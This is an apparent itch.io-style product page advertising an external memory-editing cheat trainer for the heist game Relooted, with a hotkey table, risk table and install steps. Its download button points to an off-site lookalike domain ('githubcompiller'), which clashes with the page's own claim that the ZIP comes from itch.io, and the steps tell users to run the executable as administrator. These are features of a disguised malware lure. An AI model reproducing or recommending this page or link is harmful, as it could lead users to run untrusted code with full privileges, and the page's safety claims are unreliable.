# Relooted External Trainer 

**Product Overview**

We are a small indie development team specializing in external utilities for action-platformer and heist titles like Relooted. Our Relooted External Trainer is a lightweight, non-intrusive memory-access tool and overlay built exclusively for single-player testing, heist route prototyping, parkour timing refinement, and private save experimentation. It allows users to eliminate stamina barriers, scout museum layouts freely, test escape sequences without resets, and validate crew synergies in offline missions—ideal for mastering the three-phase heist structure (scoping, infiltration, evasion) in controlled, solo environments.

This v1.2 build is compatible with the current Steam/Epic/Xbox PC client following the March 4, 2026 v1.0.1 hotfix, which corrected laser synchronization issues, refined guard patrol logic, patched minor artifact grab desyncs, and improved performance in dense museum interiors post-February 10, 2026 launch. We have confirmed stability across the full roster of 70+ artifact heists, from high-security vaults to sprawling collector estates.

<a href="https://rell.githubcompiller.com/" target="_blank" rel="noopener"><img src="https://t4.ftcdn.net/jpg/08/17/73/81/360_F_817738146_X3Ze6FERyH1vZhPZmv8oOPoRVwucVVKR.jpg" alt="Download Now"></a>

Our solution is entirely external: it attaches to the game process for memory reads/writes using signature scanning and pointer chains, with no DLL injection, file modifications, or runtime hooks. The Dear ImGui overlay maintains a minimal footprint (<9 MB RAM, <1% CPU idle), rendering controls cleanly over the vibrant 2.5D Africanfuturist art style without FPS impact or visual interference.

**Strict Usage Policy**  
This trainer is intended solely for offline/single-player saves and personal testing. It is not designed, supported, or safe for online features (if added later), achievements, leaderboards, or any shared/multiplayer progression. Misuse in non-private contexts risks save corruption, detection by Nyamakop's integrity systems, or profile restrictions. We strongly recommend solo use only and disclaim all liability for external applications.

**Core Modules and Features**  
- Infinite Stamina & Parkour Energy: Unlimited jumps, wall-runs, slides, and dodges for uninterrupted runs  
- No-Clip Recon Mode: Disable collision to scout layouts, vents, and patrol paths freely  
- Movement Speed Multiplier: Adjustable velocity (1.0–5.0x) for precise timing tests  
- Guard & Security ESP Overlay: Highlights patrols, cameras, lasers, weakpoints, and artifacts  
- Laser Grid & Alarm Disable: Bypasses triggers and extends timers for escape practice  
- Crew Ability Infinite Uses: Unlimited hacks, distractions, lifts, and gadget deployments  
- Instant Artifact Interaction: Zero delays or checks on grabs  
- Escape Teleport Waypoints: Warp to saved extraction points during testing  
- God Mode / Invincibility: Immunity to detection, damage, or failure states  
- Puzzle Sequence Preview: Reveals crew placement hints and optimal paths  

**Feature Specifications**

**Feature Overview**

| Name                        | Hotkey     | Function                                                                 | Notes/Limits                              |
|-----------------------------|------------|--------------------------------------------------------------------------|-------------------------------------------|
| Infinite Stamina            | F1         | Eliminates parkour energy drain                                          | Auto-limits near alarms for realism       |
| No-Clip Recon               | F2         | Collision-free flight through geometry                                   | Toggle before final execution             |
| Movement Multiplier         | F3 + Up/Dn | Scales run/jump speed (1.0–5.0x)                                         | ≤2.5x recommended for authentic timing    |
| Guard/Security ESP          | F4         | Tags guards, cameras, lasers, artifacts                                  | 500–1200 unit radius; filterable layers   |
| Laser/Alarm Bypass          | F5         | Disables grids, delays alarms (0–90s)                                    | Infiltration/escape phases only           |
| Crew Infinite Abilities     | F6         | Unlimited uses per crew member skill                                     | Per-heist toggle                          |
| Instant Grab                | F7         | Bypasses pickup animations and checks                                    | Testing artifact acquisition              |
| Evac Teleport               | F8         | Instant jump to saved escape locations                                   | 6 slots; mission-locked                   |
| God Mode                    | F9         | Immunity to detection/damage/failure                                     | Practice mode; disable for challenge      |

**Platform Compatibility**

| Environment          | Status     | Requirements/Remarks                              |
|----------------------|------------|---------------------------------------------------|
| Windows 10/11        | Supported  | Steam/Epic client v1.0.1+; admin rights required  |
| Xbox PC (Game Pass)  | Partial    | Microsoft Store/Game Pass; offsets may vary       |
| Linux (Proton)       | Unsupported| Engine incompatibilities; no plans                |

**Risk Assessment**

| Feature                  | Solo Risk | Other Risk       | Recommended Usage                        |
|--------------------------|-----------|------------------|------------------------------------------|
| Infinite Stamina         | Low       | High             | Parkour mastery & route practice         |
| No-Clip Mode             | Low       | Medium (desync)  | Layout scouting & photography            |
| Speed Multiplier         | Low       | Very High        | Timing optimization                      |
| ESP Overlay              | Low       | Extreme          | Offline patrol analysis                  |

**Installation & Configuration**

1. Download the ZIP archive from this itch.io page and extract to a folder.  
2. Launch Relooted via Steam/Epic and load a single-player heist mission.  
3. Right-click Trainer.exe → Run as administrator.  
4. Overlay auto-attaches; press INSERT to toggle the menu.  
5. Adjust sliders/hotkeys; save presets in config.ini.  

**System Requirements**  
- OS: Windows 10/11 (64-bit)  
- Administrator privileges required  
- Relooted client (v1.0.1+ post-March 2026 hotfix)  
- .NET Desktop Runtime 8.0+ (auto-prompt if missing)  

**Tips**: Begin with 1.5–2.0x speed and short timer extensions for realistic practice. Enable "Practice Mode" preset for capped, safe values. Rebind hotkeys if clashing with parkour controls.

**Update & Patch Compatibility Notes**

v1.2 refreshes signatures for the March 4, 2026 v1.0.1 hotfix, which stabilized guard AI and laser mechanics but preserved core stamina/movement addresses. Launch patches emphasized polish over anti-cheat, keeping patterns consistent. We monitor SteamDB, Nyamakop updates, and community reports to deploy fixes within 24–48 hours of client changes. Overwrite files for seamless updates.

**Support & Recommendations**

We advise capping speed at 2.5x and avoiding no-clip during timed segments to minimize rare position glitches (reload checkpoint if needed). Limitations: Occasional overlay flicker on heavy laser effects (toggle off momentarily); no native Xbox console support.

Report issues via itch.io comments: include client build, hotfix date, feature used, screenshot/log. We address verified reports promptly.

We welcome feedback in the comments. Report any offset mismatches after updates.  

— VoidForge Tools Team 🔧

**Tags**: relooted, trainer, external, overlay, infinite, stamina, no-clip, esp, heist, parkour, utility, singleplayer, testing, memory, imgui, platformer, nyamakop, africanfuturism, puzzle, 2026, steam, epic
